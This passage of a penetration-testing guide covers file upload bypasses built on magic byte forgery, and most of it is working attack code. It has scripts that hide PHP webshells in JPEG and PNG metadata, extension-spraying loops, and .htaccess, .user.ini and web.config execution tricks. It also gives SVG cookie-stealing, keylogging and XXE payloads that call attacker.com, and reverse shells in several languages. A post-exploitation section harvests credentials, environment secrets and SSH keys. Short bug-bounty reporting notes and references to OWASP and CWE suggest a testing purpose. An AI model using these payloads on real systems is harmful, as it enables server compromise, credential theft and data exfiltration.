      # Save with EXIF containing payload
      buf = io.BytesIO()
      img.save(buf, 'JPEG', quality=95)
      jpeg_data = buf.getvalue()

      # Insert COM segment after SOI marker
      payload = php_code.encode()
      com_segment = b'\xff\xfe' + struct.pack('>H', len(payload) + 2) + payload

      # SOI is first 2 bytes, insert COM right after
      modified = jpeg_data[:2] + com_segment + jpeg_data[2:]

      return modified

  def create_xmp_survivor(php_code):
      """
      XMP metadata sometimes survives re-encoding.
      Embed payload in XMP data.
      """
      img = Image.new('RGB', (100, 100), color='blue')
      buf = io.BytesIO()
      img.save(buf, 'JPEG', quality=95)
      jpeg_data = buf.getvalue()

      # XMP APP1 segment
      xmp_data = f'''<?xpacket begin="\xef\xbb\xbf" id="W5M0MpCehiHzreSzNTczkc9d"?>
  <x:xmpmeta xmlns:x="adobe:ns:meta/">
  <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
  <rdf:Description rdf:about="" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <dc:description>{php_code}</dc:description>
  </rdf:Description>
  </rdf:RDF>
  </x:xmpmeta>
  <?xpacket end="w"?>'''.encode()

      app1_marker = b'\xff\xe1' + struct.pack('>H', len(xmp_data) + 2 + 29) + b'http://ns.adobe.com/xap/1.0/\x00' + xmp_data

      modified = jpeg_data[:2] + app1_marker + jpeg_data[2:]
      return modified

  # Generate payloads
  php = '<?php system($_GET["cmd"]); ?>'

  with open('gd_pixel_bypass.jpg', 'wb') as f:
      f.write(embed_in_pixels(php))
  print("[+] gd_pixel_bypass.jpg — PHP in pixel data")

  with open('gd_comment_bypass.jpg', 'wb') as f:
      f.write(create_comment_survivor(php))
  print("[+] gd_comment_bypass.jpg — PHP in COM segment")

  with open('gd_xmp_bypass.jpg', 'wb') as f:
      f.write(create_xmp_survivor(php))
  print("[+] gd_xmp_bypass.jpg — PHP in XMP metadata")
  ```
  :::

  :::accordion-item{icon="i-lucide-shield-off" label="IDAT Chunk PHP Injection (PNG)"}
  ```python [idat_injection.py]
  #!/usr/bin/env python3
  """
  Inject PHP code into PNG IDAT chunk data in a way that survives
  image re-processing. The deflated pixel data is crafted to contain
  the PHP payload when decompressed and viewed as text.

  Reference: https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/
  """
  import zlib
  import struct
  import itertools

  def create_png_idat_shell():
      """
      Create a PNG where the raw IDAT data contains PHP when interpreted as text.
      This is extremely difficult but theoretically possible for short payloads.

      For practical use, we create a valid PNG that has PHP in a non-IDAT chunk
      that some image processors copy without modification.
      """

      # Method: Use ancillary chunks that survive processing
      # tEXt, zTXt, iTXt chunks are often preserved

      png_sig = b'\x89PNG\r\n\x1a\n'

      def make_chunk(ctype, data):
          c = ctype + data
          return struct.pack('>I', len(data)) + c + struct.pack('>I', zlib.crc32(c) & 0xffffffff)

      # IHDR — 32x32, RGBA
      ihdr = struct.pack('>IIBBBBB', 32, 32, 8, 6, 0, 0, 0)

      # IDAT — valid pixel data (32x32 transparent)
      raw = b''
      for y in range(32):
          raw += b'\x00' + b'\xff\x00\x00\xff' * 32  # Red pixels with full alpha
      compressed = zlib.compress(raw)

      # tEXt chunk with PHP payload
      php_payload = b'<?php system($_GET["cmd"]); ?>'
      text_data = b'Comment\x00' + php_payload

      # zTXt chunk (compressed text — may survive different processors)
      ztxt_keyword = b'Description\x00'
      ztxt_compressed = b'\x00' + zlib.compress(php_payload)
      ztxt_data = ztxt_keyword + ztxt_compressed

      # Build PNG
      png = png_sig
      png += make_chunk(b'IHDR', ihdr)
      png += make_chunk(b'tEXt', text_data)
      png += make_chunk(b'zTXt', ztxt_data)
      png += make_chunk(b'IDAT', compressed)
      png += make_chunk(b'IEND', b'')

      with open('idat_shell.png', 'wb') as f:
          f.write(png)

      print(f"[+] idat_shell.png ({len(png)} bytes)")
      print("[*] PHP payload in tEXt and zTXt chunks")

      # Verify PHP is in the file
      with open('idat_shell.png', 'rb') as f:
          data = f.read()
          if b'<?php' in data:
              print("[+] PHP payload confirmed in PNG file")

  create_png_idat_shell()
  ```
  :::

  :::accordion-item{icon="i-lucide-shield-off" label="Plupload / Chunk Upload Bypass"}
  ```bash
  # ── Some upload handlers process files in chunks ──
  # Magic byte check is on the first chunk only

  # Split payload so first chunk has valid header
  # Second chunk has PHP code

  # Create multipart chunked upload
  SHELL='<?php system($_GET["cmd"]); ?>'

  # Chunk 1: Valid JPEG header (passes magic byte check)
  printf '\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00' > /tmp/chunk1.bin

  # Chunk 2: PHP code
  echo -n "$SHELL" > /tmp/chunk2.bin

  # Upload chunk 1
  curl -X POST "https://target.com/api/upload/chunk" \
    -F "file=@/tmp/chunk1.bin;filename=avatar.php" \
    -F "chunk=0" \
    -F "chunks=2" \
    -H "Cookie: session=TOKEN"

  # Upload chunk 2
  curl -X POST "https://target.com/api/upload/chunk" \
    -F "file=@/tmp/chunk2.bin;filename=avatar.php" \
    -F "chunk=1" \
    -F "chunks=2" \
    -H "Cookie: session=TOKEN"

  # Finalize upload
  curl -X POST "https://target.com/api/upload/finalize" \
    -d "filename=avatar.php" \
    -H "Cookie: session=TOKEN"

  rm /tmp/chunk1.bin /tmp/chunk2.bin
  ```
  :::
::

### Filename Manipulation Combos

::code-group
```bash [Extension Bypass Spray]
# ── Combine magic byte forgery with extension bypasses ──

MAGIC_SHELL=$(mktemp)
printf '\xFF\xD8\xFF\xE0<?php system($_GET["cmd"]); ?>' > "$MAGIC_SHELL"

EXTENSIONS=(
    # Direct PHP
    "php" "phtml" "php5" "php7" "php4" "pht" "phps" "phar"
    "pHp" "PHP" "Php" "pHP" "PhP" "PHp" "pHp5" "PHTML"

    # Double extensions (first wins)
    "php.jpg" "php.jpeg" "php.png" "php.gif" "php.bmp"
    "php.txt" "php.pdf" "php.html" "php.xml"
    "phtml.jpg" "php5.png" "pht.gif"

    # Double extensions (last wins)
    "jpg.php" "png.php" "gif.php" "bmp.php"
    "jpeg.phtml" "png.php5" "gif.pht"

    # Triple extensions
    "php.jpg.php" "jpg.php.jpg" "php.png.php"

    # Null byte (for older systems)
    "php%00.jpg" "php%00.png" "php%00.gif"

    # Trailing characters
    "php." "php " "php::$DATA" "php%20" "php%0a" "php%0d"
    "php......." "php::$DATA......"

    # Case mixing
    "PhP" "pHp" "PHP" "Php" "phP" "PHp" "pHP"

    # Apache handler bypass
    "php.blah" "php.xxx" "php.test"

    # Less common PHP extensions
    "pgif" "shtml" "inc" "module"

    # Config files that might execute PHP
    ".htaccess" ".user.ini"
)

UPLOAD_URL="https://target.com/api/upload"

for ext in "${EXTENSIONS[@]}"; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
      -F "file=@${MAGIC_SHELL};filename=avatar.${ext};type=image/jpeg" \
      -H "Cookie: session=TOKEN" 2>/dev/null)
    [ "$STATUS" = "200" ] && echo "[+] ACCEPTED: .${ext}"
done

rm "$MAGIC_SHELL"
```

```bash [htaccess + Magic Byte Chain]
# ── Upload .htaccess to enable PHP execution on image files ──
# Then upload magic-byte-forged shell with image extension

# Step 1: Upload .htaccess
cat > .htaccess << 'EOF'
AddType application/x-httpd-php .jpg .jpeg .png .gif .bmp
php_flag engine on
EOF

curl -X POST https://target.com/api/upload \
  -F "file=@.htaccess;filename=.htaccess;type=text/plain" \
  -H "Cookie: session=TOKEN"

# Step 2: Upload shell with image extension + magic bytes
printf '\xFF\xD8\xFF\xE0<?php system($_GET["cmd"]); ?>' > shell.jpg
curl -X POST https://target.com/api/upload \
  -F "file=@shell.jpg;type=image/jpeg" \
  -H "Cookie: session=TOKEN"

# Step 3: Access shell
curl -s "https://target.com/uploads/shell.jpg?cmd=id"

# ── Alternative: .user.ini for PHP-FPM ──
echo 'auto_prepend_file=shell.jpg' > .user.ini
curl -X POST https://target.com/api/upload \
  -F "file=@.user.ini;filename=.user.ini;type=text/plain" \
  -H "Cookie: session=TOKEN"

# Now ANY .php file in that directory will auto-include shell.jpg
curl -s "https://target.com/uploads/index.php?cmd=id"
```

```bash [web.config Upload for IIS]
# ── IIS web.config to execute PHP/ASP from image extensions ──

cat > web.config << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers accessPolicy="Read, Script, Write">
      <add name="web_config" path="*.jpg" verb="*"
           modules="IsapiModule"
           scriptProcessor="%windir%\system32\inetsrv\asp.dll"
           resourceType="Unspecified" requireAccess="Write" />
    </handlers>
    <security>
      <requestFiltering>
        <fileExtensions>
          <remove fileExtension=".config" />
        </fileExtensions>
      </requestFiltering>
    </security>
  </system.webServer>
</configuration>
EOF

# Upload web.config
curl -X POST https://target.com/api/upload \
  -F "file=@web.config;filename=web.config" \
  -H "Cookie: session=TOKEN"

# Upload ASP shell with JPG extension + BMP magic
printf 'BM<%% eval request("cmd") %%>' > shell.jpg
curl -X POST https://target.com/api/upload \
  -F "file=@shell.jpg;type=image/jpeg" \
  -H "Cookie: session=TOKEN"
```
::

### SVG Attack Vectors

::tabs
  :::tabs-item{icon="i-lucide-code" label="SVG XSS Payloads"}
  ```bash
  # ── SVG is an image format that executes JavaScript ──
  # Many apps allow SVG upload but don't sanitize the XML content

  # Basic XSS
  cat > xss_basic.svg << 'EOF'
  <?xml version="1.0" encoding="UTF-8"?>
  <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
    <script>alert(document.domain)</script>
  </svg>
  EOF

  # Cookie stealing
  cat > xss_steal.svg << 'EOF'
  <svg xmlns="http://www.w3.org/2000/svg">
    <script>
      fetch('https://attacker.com/log?c='+document.cookie);
    </script>
  </svg>
  EOF

  # Keylogger
  cat > xss_keylog.svg << 'EOF'
  <svg xmlns="http://www.w3.org/2000/svg">
    <script>
      document.addEventListener('keypress',function(e){
        new Image().src='https://attacker.com/log?k='+e.key;
      });
    </script>
  </svg>
  EOF

  # Event handler based (bypasses some script tag filters)
  cat > xss_event.svg << 'EOF'
  <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
    <rect width="100" height="100" fill="red"/>
  </svg>
  EOF

  # ForeignObject XSS
  cat > xss_foreign.svg << 'EOF'
  <svg xmlns="http://www.w3.org/2000/svg">
    <foreignObject width="100" height="100">
      <body xmlns="http://www.w3.org/1999/xhtml">
        <script>alert(document.domain)</script>
      </body>
    </foreignObject>
  </svg>
  EOF

  # Animate-based XSS
  cat > xss_animate.svg << 'EOF'
  <svg xmlns="http://www.w3.org/2000/svg">
    <animate onbegin="alert(document.domain)" attributeName="x" dur="1s"/>
  </svg>
  EOF

  # Set-based XSS
  cat > xss_set.svg << 'EOF'
  <svg xmlns="http://www.w3.org/2000/svg">
    <set attributeName="onmouseover" to="alert(document.domain)"/>
  </svg>
  EOF

  # Upload each
  for svg in xss_*.svg; do
      echo "[*] Uploading: $svg"
      curl -s -o /dev/null -w "%{http_code}" -X POST https://target.com/api/upload \
        -F "file=@${svg};type=image/svg+xml" \
        -H "Cookie: session=TOKEN"
      echo ""
  done
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="SVG SSRF / XXE"}
  ```bash
  # ── SVG-based SSRF and XXE attacks ──

  # AWS metadata SSRF
  cat > ssrf_aws.svg << 'EOF'
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
  ]>
  <svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">
    <text x="10" y="50" font-size="14">&xxe;</text>
  </svg>
  EOF

  # GCP metadata SSRF
  cat > ssrf_gcp.svg << 'EOF'
  <?xml version="1.0"?>
  <!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/?recursive=true">
  ]>
  <svg xmlns="http://www.w3.org/2000/svg">
    <text>&xxe;</text>
  </svg>
  EOF

  # Local file read
  cat > xxe_passwd.svg << 'EOF'
  <?xml version="1.0"?>
  <!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ]>
  <svg xmlns="http://www.w3.org/2000/svg">
    <text x="10" y="20" font-size="10">&xxe;</text>
  </svg>
  EOF

  # Internal network scanning
  for port in 80 443 8080 8443 3306 5432 6379 27017 9200 11211; do
      cat > ssrf_scan_${port}.svg << SVGEOF
  <?xml version="1.0"?>
  <!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "http://127.0.0.1:${port}/">
  ]>
  <svg xmlns="http://www.w3.org/2000/svg">
    <text>&xxe;</text>
  </svg>
  SVGEOF
  done

  # OOB XXE via SVG (data exfiltration)
  cat > xxe_oob.svg << 'EOF'
  <?xml version="1.0"?>
  <!DOCTYPE svg [
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % dtd SYSTEM "http://attacker.com/xxe.dtd">
    %dtd;
  ]>
  <svg xmlns="http://www.w3.org/2000/svg">
    <text>&send;</text>
  </svg>
  EOF

  # Corresponding DTD on attacker server (xxe.dtd):
  # <!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/steal?data=%file;'>">
  # %all;

  # PHP expect wrapper via SVG XXE
  cat > xxe_rce.svg << 'EOF'
  <?xml version="1.0"?>
  <!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "expect://id">
  ]>
  <svg xmlns="http://www.w3.org/2000/svg">
    <text>&xxe;</text>
  </svg>
  EOF

  # Upload all
  for svg in ssrf_*.svg xxe_*.svg; do
      echo -n "[*] ${svg}: "
      curl -s -o /dev/null -w "%{http_code}" -X POST https://target.com/api/upload \
        -F "file=@${svg};type=image/svg+xml" \
        -H "Cookie: session=TOKEN"
      echo ""
  done
  ```
  :::
::

---

## Tool Arsenal

### Scanning & Detection Tools

::tabs
  :::tabs-item{icon="i-lucide-wrench" label="fuxploider"}
  ```bash
  # ── fuxploider — Automated file upload vulnerability scanner ──
  # https://github.com/almandin/fuxploider

  git clone https://github.com/almandin/fuxploider.git
  cd fuxploider
  pip3 install -r requirements.txt

  # Basic scan
  python3 fuxploider.py \
    --url https://target.com/upload \
    --not-regex "error|invalid|denied"

  # With authentication
  python3 fuxploider.py \
    --url https://target.com/upload \
    --cookies "session=AUTH_TOKEN" \
    --not-regex "error|invalid"

  # Specify form field
  python3 fuxploider.py \
    --url https://target.com/upload \
    --input-name "file" \
    --cookies "session=TOKEN"

  # With custom extensions
  python3 fuxploider.py \
    --url https://target.com/upload \
    --extensions php,phtml,php5,jsp,aspx \
    --cookies "session=TOKEN"
  ```
  :::

  :::tabs-item{icon="i-lucide-wrench" label="upload-scanner (Burp)"}
  ```text
  # ── Burp Upload Scanner Extension ──
  # Install from BApp Store: "Upload Scanner"

  # Configuration:
  # 1. Go to Upload Scanner tab
  # 2. Set target upload request
  # 3. Enable checks:
  #    ✓ Magic byte bypass
  #    ✓ Extension bypass
  #    ✓ Content-Type bypass
  #    ✓ Polyglot files
  #    ✓ SVG XSS
  #    ✓ XXE via document upload
  #    ✓ Path traversal in filename
  #    ✓ Double extension
  #    ✓ Null byte extension

  # 4. Configure scan profiles:
  #    - "Quick" — common magic bytes + extensions
  #    - "Thorough" — all combinations
  #    - "Custom" — specific format focus

  # 5. Review results in Scanner Issues tab
  # Each finding includes the exact request that bypassed validation
  ```
  :::

  :::tabs-item{icon="i-lucide-wrench" label="Custom file Verification"}
  ```bash
  # ── Verify file type identification ──

  # Linux file command
  file crafted_shell.php.jpg
  file --mime-type crafted_shell.php.jpg
  file -b crafted_shell.php.jpg

  # Hex dump first bytes
  xxd crafted_shell.php.jpg | head -5
  hexdump -C crafted_shell.php.jpg | head -5

  # Python-based identification
  python3 -c "
  import magic
  m = magic.Magic(mime=True)
  print(m.from_file('crafted_shell.php.jpg'))
  m2 = magic.Magic()
  print(m2.from_file('crafted_shell.php.jpg'))
  "

  # Verify magic bytes match expected
  python3 -c "
  with open('crafted_shell.php.jpg', 'rb') as f:
      header = f.read(20)
      print('Hex:', header.hex())
      print('ASCII:', repr(header))

      signatures = {
          b'\xff\xd8\xff': 'JPEG',
          b'\x89PNG': 'PNG',
          b'GIF87a': 'GIF87a',
          b'GIF89a': 'GIF89a',
          b'BM': 'BMP',
          b'%PDF': 'PDF',
          b'PK': 'ZIP/DOCX/XLSX',
      }
      for sig, name in signatures.items():
          if header.startswith(sig):
              print(f'Detected: {name}')
              break
  "

  # Batch verify all payloads
  for f in payloads/*; do
      MIME=$(file --mime-type -b "$f")
      MAGIC=$(file -b "$f" | cut -d, -f1)
      echo "$f: $MIME ($MAGIC)"
  done
  ```
  :::

  :::tabs-item{icon="i-lucide-wrench" label="Nuclei Upload Templates"}
  ```yaml [magic-byte-upload.yaml]
  id: magic-byte-upload-bypass

  info:
    name: Magic Byte File Upload Bypass
    author: bughunter
    severity: critical
    tags: file-upload,magic-byte,rce
    description: Tests file upload endpoints for magic byte validation bypass

  # Note: Nuclei doesn't natively support file upload testing well.
  # Use this to discover endpoints, then test manually.

  http:
    - method: GET
      path:
        - "{{BaseURL}}/upload"
        - "{{BaseURL}}/api/upload"
        - "{{BaseURL}}/api/v1/upload"
        - "{{BaseURL}}/api/files"
        - "{{BaseURL}}/api/media"
        - "{{BaseURL}}/api/images"
        - "{{BaseURL}}/admin/upload"
        - "{{BaseURL}}/user/avatar"
        - "{{BaseURL}}/profile/photo"
        - "{{BaseURL}}/editor/upload"
        - "{{BaseURL}}/media/upload"
        - "{{BaseURL}}/settings/logo"

      stop-at-first-match: false

      matchers-condition: or
      matchers:
        - type: status
          status:
            - 200
            - 301
            - 302
            - 405

        - type: word
          words:
            - "upload"
            - "multipart"
            - "file"
            - "enctype"
            - "type=\"file\""
            - "dropzone"
          condition: or
  ```
  :::
::

---

## Post-Exploitation

### Upgrading Access After Upload

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Webshell to Reverse Shell"}
  ```bash
  # ── After confirming webshell execution ──

  SHELL_URL="https://target.com/uploads/shell.php"
  ATTACKER_IP="10.10.14.1"
  ATTACKER_PORT="4444"

  # Start listener
  # Terminal 1:
  nc -lvnp $ATTACKER_PORT

  # Terminal 2 — trigger reverse shell via webshell:

  # Bash reverse shell
  curl -s "${SHELL_URL}?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/${ATTACKER_IP}/${ATTACKER_PORT}+0>%261'"

  # Python reverse shell
  curl -s "${SHELL_URL}" --data-urlencode "cmd=python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"${ATTACKER_IP}\",${ATTACKER_PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'"

  # Perl reverse shell
  curl -s "${SHELL_URL}" --data-urlencode "cmd=perl -e 'use Socket;\$i=\"${ATTACKER_IP}\";\$p=${ATTACKER_PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");};'"

  # PHP reverse shell (meta)
  curl -s "${SHELL_URL}" --data-urlencode "cmd=php -r '\$sock=fsockopen(\"${ATTACKER_IP}\",${ATTACKER_PORT});exec(\"/bin/bash -i <&3 >&3 2>&3\");'"

  # Wget + execute
  curl -s "${SHELL_URL}" --data-urlencode "cmd=wget http://${ATTACKER_IP}:8080/rev.sh -O /tmp/rev.sh && chmod +x /tmp/rev.sh && /tmp/rev.sh"

  # Download and execute via curl
  curl -s "${SHELL_URL}" --data-urlencode "cmd=curl http://${ATTACKER_IP}:8080/rev.sh | bash"
  ```
  :::

  :::tabs-item{icon="i-lucide-flag" label="Data Exfiltration via Webshell"}
  ```bash
  # ── Extract sensitive data through uploaded webshell ──

  SHELL_URL="https://target.com/uploads/shell.php"

  # System info
  curl -s "${SHELL_URL}?cmd=id;hostname;uname+-a;cat+/etc/os-release" | tee system_info.txt

  # Environment variables (secrets, API keys)
  curl -s "${SHELL_URL}?cmd=env" | tee env_vars.txt

  # Application config files
  curl -s "${SHELL_URL}" --data-urlencode "cmd=find / -name '.env' -o -name 'config.php' -o -name 'database.yml' -o -name 'settings.py' -o -name 'wp-config.php' -o -name 'web.config' 2>/dev/null" | tee config_paths.txt

  # Read found configs
  while IFS= read -r config; do
      echo "═══ $config ═══"
      curl -s "${SHELL_URL}" --data-urlencode "cmd=cat $config"
      echo ""
  done < config_paths.txt | tee config_contents.txt

  # Database credentials
  curl -s "${SHELL_URL}" --data-urlencode "cmd=grep -rn 'password\|passwd\|db_pass\|DB_PASS\|DATABASE_URL\|MONGO_URI\|REDIS_URL' /var/www/ /app/ /opt/ 2>/dev/null | head -50" | tee db_creds.txt

  # SSH keys
  curl -s "${SHELL_URL}" --data-urlencode "cmd=find / -name 'id_rsa' -o -name 'id_ed25519' -o -name 'authorized_keys' 2>/dev/null" | tee ssh_keys.txt

  # Network connections
  curl -s "${SHELL_URL}" --data-urlencode "cmd=ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null" | tee network.txt

  # Internal hosts
  curl -s "${SHELL_URL}" --data-urlencode "cmd=cat /etc/hosts; echo '---'; arp -a 2>/dev/null; echo '---'; cat /proc/net/arp 2>/dev/null" | tee internal_hosts.txt
  ```
  :::

  :::tabs-item{icon="i-lucide-shield" label="Safe PoC for Reports"}
  ```bash
  # ── Non-destructive impact demonstration ──

  # Create harmless proof file with magic bytes
  TIMESTAMP=$(date +%s)
  printf '\xFF\xD8\xFF\xE0<?php echo "MAGIC_BYTE_UPLOAD_POC_'${TIMESTAMP}'"; echo "\nServer: ".php_uname()."\nPHP: ".phpversion()."\nUser: ".get_current_user(); ?>' > poc_safe.php.jpg

  # Upload
  curl -X POST https://target.com/api/upload \
    -F "file=@poc_safe.php.jpg;type=image/jpeg" \
    -H "Cookie: session=TOKEN"

  # Verify execution (no system commands — just info display)
  curl -s "https://target.com/uploads/poc_safe.php.jpg"

  # Expected output:
  # MAGIC_BYTE_UPLOAD_POC_1234567890
  # Server: Linux target 5.4.0 x86_64
  # PHP: 8.1.0
  # User: www-data

  # Screenshot this for your report

  echo ""
  echo "═══ Bug Bounty Report Notes ═══"
  echo "Vulnerability: File Upload Bypass via Magic Byte Forgery"
  echo "Endpoint: POST /api/upload"
  echo "Bypass: JPEG magic bytes (FF D8 FF E0) prepended to PHP webshell"
  echo "Extension: .php.jpg (double extension accepted)"
  echo "Content-Type: image/jpeg (spoofed)"
  echo "Impact: Remote Code Execution as $(whoami)"
  echo "PoC Timestamp: ${TIMESTAMP}"
  ```
  :::
::

---

## Validation Detection Matrix

::note
Understanding exactly which validation method is in use determines your bypass strategy. Use this systematic approach to map the target's defenses.
::

::collapsible

| Test | Result | Validation Detected | Bypass Strategy |
| ---- | ------ | ------------------- | --------------- |
| Upload `shell.php` (no magic bytes) | **Rejected** | Extension blacklist | Double extension, case variation, alternative extensions |
| Upload `shell.txt` with PHP content | **Accepted** | Extension whitelist only | Find executable extension in whitelist, `.htaccess` |
| Upload `shell.php` with `Content-Type: image/jpeg` | **Accepted** | Content-Type check only | Spoof Content-Type header |
| Upload `shell.jpg` with PHP content (no magic) | **Rejected** | Magic byte validation | Prepend valid magic bytes |
| Upload `shell.jpg` with JPEG magic + PHP | **Accepted** | Magic byte check only | Magic byte forgery ✓ |
| Upload `shell.php` with JPEG magic + PHP | **Rejected** | Magic bytes + Extension | Magic bytes + double extension / `.htaccess` |
| Upload valid JPEG with PHP in EXIF | **Rejected** | Full image parsing | Pixel-level embedding, re-encoding bypass |
| Upload valid JPEG with PHP in EXIF, re-download shows no PHP | **Rejected** | Image re-encoding | IDAT chunk injection, ICC profile, polyglot |
| Upload SVG with `<script>` | **Accepted** | No XML sanitization | SVG XSS / SVG XXE |
| Upload SVG with `<script>` | **Rejected** | XML content filtering | Event handler XSS, foreignObject, data URI |

::

---

## Reporting & Remediation

### References & Resources

::card-group
  :::card
  ---
  icon: i-lucide-external-link
  title: OWASP — Unrestricted File Upload
  to: https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
  target: _blank
  ---
  Complete OWASP reference for file upload vulnerabilities, prevention cheat sheets, and testing methodology.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: CWE-434 — Unrestricted Upload of File with Dangerous Type
  to: https://cwe.mitre.org/data/definitions/434.html
  target: _blank
  ---
  MITRE CWE entry covering dangerous file upload, including magic byte validation weaknesses and remediation guidance.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: HackTricks — File Upload
  to: https://book.hacktricks.wiki/en/pentesting-web/file-upload/
  target: _blank
  ---
  Extensive file upload bypass techniques including magic bytes, polyglots, double extensions, and language-specific exploitation.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: PayloadsAllTheThings — Upload Insecure Files
  to: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files
  target: _blank
  ---
  Community payload repository with magic byte signatures, polyglot generators, and bypass payloads for all major web frameworks.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: File Signatures Table (Gary Kessler)
  to: https://www.garykessler.net/library/file_sigs.html
  target: _blank
  ---
  The most comprehensive file signature database — essential reference for identifying correct magic bytes for any file format.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: PortSwigger — File Upload Vulnerabilities
  to: https://portswigger.net/web-security/file-upload
  target: _blank
  ---
  PortSwigger Web Security Academy labs and learning materials covering file upload attacks with interactive exercises.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: PNG IDAT Chunk Webshell Research
  to: https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/
  target: _blank
  ---
  Seminal research on encoding PHP webshells within PNG IDAT chunks that survive image re-processing by GD library.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: HackerOne File Upload Disclosed Reports
  to: https://hackerone.com/hacktivity?querystring=file%20upload
  target: _blank
  ---
  Real-world disclosed bug bounty reports involving file upload bypasses, magic byte forgery, and RCE chains.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: fuxploider — File Upload Exploitation Tool
  to: https://github.com/almandin/fuxploider
  target: _blank
  ---
  Automated file upload vulnerability scanner that tests magic bytes, extensions, Content-Type headers, and more.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: ExifTool — Metadata Manipulation
  to: https://exiftool.org/
  target: _blank
  ---
  Swiss-army knife for reading and writing EXIF, IPTC, XMP, and other metadata — essential for EXIF-based payload injection.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: Snyk — Zip Slip & File Upload Security
  to: https://security.snyk.io/research/zip-slip-vulnerability
  target: _blank
  ---
  Research on archive-based file upload attacks that complement magic byte forgery when combined with Zip Slip techniques.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: Wikipedia — List of File Signatures
  to: https://en.wikipedia.org/wiki/List_of_file_signatures
  target: _blank
  ---
  Wikipedia's comprehensive list of file magic numbers and signatures organized by file type category.
  :::
::

---

## Quick Reference Cheatsheet

::field-group
  :::field{name="JPEG magic bytes" type="payload"}
  `\xFF\xD8\xFF\xE0` or hex `FF D8 FF E0`
  :::

  :::field{name="PNG magic bytes" type="payload"}
  `\x89PNG\r\n\x1a\n` or hex `89 50 4E 47 0D 0A 1A 0A`
  :::

  :::field{name="GIF magic bytes" type="payload"}
  `GIF89a` (plain ASCII — easiest to use)
  :::

  :::field{name="BMP magic bytes" type="payload"}
  `BM` or hex `42 4D`
  :::

  :::field{name="PDF magic bytes" type="payload"}
  `%PDF-1.4` (plain ASCII)
  :::

  :::field{name="GIF+PHP one-liner" type="command"}
  `echo 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.gif`
  :::

  :::field{name="JPEG+PHP craft" type="command"}
  `printf '\xFF\xD8\xFF\xE0' > shell.php && echo '<?php system($_GET["cmd"]); ?>' >> shell.php`
  :::

  :::field{name="EXIF injection" type="command"}
  `exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg -o shell.php.jpg`
  :::

  :::field{name="Upload with cURL" type="command"}
  `curl -X POST https://target.com/upload -F "file=@shell.php.jpg;type=image/jpeg" -H "Cookie: session=TOKEN"`
  :::

  :::field{name="Verify magic bytes" type="command"}
  `file shell.php && xxd shell.php | head -3`
  :::

  :::field{name="Verify shell execution" type="command"}
  `curl -s "https://target.com/uploads/shell.php.jpg?cmd=id"`
  :::

  :::field{name="SVG XSS upload" type="command"}
  `echo '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>' > xss.svg`
  :::
::